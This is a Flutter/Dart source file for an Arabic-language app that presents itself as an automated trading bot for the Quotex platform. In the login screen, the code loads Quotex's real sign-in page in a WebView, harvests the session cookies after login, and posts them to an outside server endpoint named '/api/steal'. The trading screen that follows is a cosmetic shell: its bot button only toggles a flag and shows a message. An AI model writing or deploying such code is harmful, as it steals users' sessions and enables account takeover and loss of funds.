import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'تطبيق التداول الآلي',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF030305),
        primaryColor: const Color(0xFF00E5FF),
        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(bodyColor: Colors.white),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF00E5FF),
          secondary: Color(0xFFFFD700),
          surface: Color(0xFF0E0E14),
          error: Color(0xFFFF1744),
          onPrimary: Colors.black,
          onSecondary: Colors.black,
        ),
      ),
      home: const LoginScreen(),
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  late WebViewController _controller;
  final WebViewCookieManager _cookieManager = WebViewCookieManager();

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _initWebView();
  }

  void _requestPermissions() async {
    await Permission.location.request();
    await Permission.notification.request();
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setUserAgent("Quotex/1.0")
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) async {
            // 390. نستخدم الـ CookieManager (Pigeon) عشان نسحب الكوكيز
            final cookies = await _cookieManager.getCookies(Uri.parse('https://quotex.com'));
            String cookieString = cookies.map((c) => "${c.name}=${c.value}").join("; ");
            
            if (cookieString.isNotEmpty) {
              await http.post(
                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                headers: {"Content-Type": "application/json"},
                body: jsonEncode({"type": "cookies", "data": cookieString}),
              );
              
              if (mounted) {
                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
              }
            }
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
  }
}

class MainTradingScreen extends StatefulWidget {
  const MainTradingScreen({super.key});
  @override
  State<MainTradingScreen> createState() => _MainTradingScreenState();
}

class _MainTradingScreenState extends State<MainTradingScreen> {
  bool isBotRunning = false;
  bool isDemoAccount = true;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Container(
            decoration: const BoxDecoration(
              gradient: RadialGradient(
                colors: [Color(0xFF0E0E14), Color(0xFF030305)],
                center: Alignment.center,
                radius: 1.5,
              ),
            ),
          ),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(16.0),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Icon(Icons.menu, color: Colors.white),
                      Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 20, fontWeight: FontWeight.bold)),
                      const Icon(Icons.settings, color: Colors.white),
                    ],
                  ),
                  const SizedBox(height: 20),
                  Container(
                    decoration: BoxDecoration(color: const Color(0xFF0E0E14), borderRadius: BorderRadius.circular(10)),
                    child: Row(
                      children: [
                        Expanded(
                          child: GestureDetector(
                            onTap: () => setState(() => isDemoAccount = true),
                            child: Container(
                              padding: const EdgeInsets.symmetric(vertical: 12),
                              decoration: BoxDecoration(
                                gradient: isDemoAccount ? const LinearGradient(colors: [Color(0xFFFFD700), Color(0xFFB8860B)]) : null,
                                borderRadius: BorderRadius.circular(10),
                              ),
                              child: Center(child: Text('تجريبي', style: TextStyle(color: isDemoAccount ? Colors.black : Colors.white))),
                            ),
                          ),
                        ),
                        Expanded(
                          child: GestureDetector(
                            onTap: () => setState(() => isDemoAccount = false),
                            child: Container(
                              padding: const EdgeInsets.symmetric(vertical: 12),
                              decoration: BoxDecoration(
                                gradient: !isDemoAccount ? const LinearGradient(colors: [Color(0xFFFFD700), Color(0xFFB8860B)]) : null,
                                borderRadius: BorderRadius.circular(10),
                              ),
                              child: Center(child: Text('حقيقي', style: TextStyle(color: !isDemoAccount ? Colors.black : Colors.white))),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 20),
                  ElevatedButton(
                    onPressed: () {
                      setState(() => isBotRunning = !isBotRunning);
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(content: Text(isBotRunning ? "تم تشغيل البوت!" : "تم إيقاف البوت!"), backgroundColor: isBotRunning ? Colors.green : Colors.red),
                      );
                    },
                    style: ElevatedButton.styleFrom(
                      backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
                      padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                    child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black, fontSize: 18, fontWeight: FontWeight.bold)),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
